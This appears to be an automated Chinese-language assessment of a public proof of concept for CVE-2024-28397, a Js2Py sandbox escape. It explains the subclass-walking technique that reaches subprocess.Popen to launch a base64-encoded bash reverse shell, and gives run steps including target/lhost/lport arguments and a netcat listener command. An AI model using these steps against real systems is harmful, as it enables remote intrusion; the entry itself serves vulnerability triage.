## CVE-2024-28397 - Js2Py RCE

**漏洞编号:** CVE-2024-28397

**漏洞类型:** RCE

**影响应用:** Js2Py

**危害等级:** Critical

**CVSS评分:** 9.8

**影响版本:** All versions of Js2Py prior to the fix.

**利用条件:** Target application evaluates untrusted JS code via Js2Py. Requires network access to the vulnerable endpoint.

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 35%

## 详情

CVE-2024-28397是Js2Py中的一个沙箱逃逸漏洞，Js2Py是一个用于Python的JavaScript解释器。当目标应用程序通过Js2Py评估不受信任的JS代码时，攻击者可以突破沙箱并执行任意Python代码。这可以被利用来获得远程代码执行（RCE）并在易受攻击的系统上获得反向shell。

POC有效性分析：
提供的PoC代码（exploit.py）是一个完整的利用脚本，它利用了Js2Py中的`__class__.__base__.__subclasses__`漏洞来逃逸沙箱并执行任意Python代码。该脚本自动生成一个Bash反向shell，对其进行Base64编码，并将其注入到JavaScript有效负载中。然后，JS有效负载使用`__class__.__base__.__subclasses__()`在Python对象树中查找`subprocess.Popen`，并使用`Popen`解码和执行shell。攻击者的机器接收反向shell并自动稳定它。该脚本使用简单，只需要目标URL、本地IP地址和端口作为参数。

利用步骤：
1. 确保已安装Python 3.x和`requests`模块（`pip install requests`）。
2. 下载或克隆包含`exploit.py`和`README.md`的PoC代码库。
3. 使用以下命令运行exploit.py：
   `python3 exploit.py --target http://example.htb --lhost 10.10.14.51 --lport 4444`
   将`http://example.htb`替换为易受攻击的Web应用程序端点的完整URL，将`10.10.14.51`替换为您的本地IP地址，并将`4444`替换为要接收shell的本地端口。
4. 在您的本地机器上设置一个监听器（例如，使用`nc -lvnp 4444`）。
5. 该脚本将发送包含恶意JavaScript有效负载的请求到目标，如果成功，您将在本地机器上收到一个反向shell。

投毒风险分析：
该PoC的投毒风险中等。虽然代码本身相对清晰且易于理解，但它包含Base64编码的shell命令。Base64编码常被用于混淆恶意代码，增加了投毒风险。脚本还使用了`subprocess.Popen`来执行shell命令，这是一种潜在的危险操作，如果被恶意修改，可能导致系统被破坏。此外，该脚本依赖于`requests`库，如果requests库本身被投毒，可能会影响该脚本的安全性。虽然该PoC的主要目的是利用已知的漏洞，但如果攻击者修改该脚本以包含额外的恶意功能（例如，下载和执行其他恶意软件），则存在投毒风险。因此，在使用该PoC时，建议仔细检查代码，确保其没有被篡改。

**项目地址:** https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape (mentioned in README.md)

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2024-28397
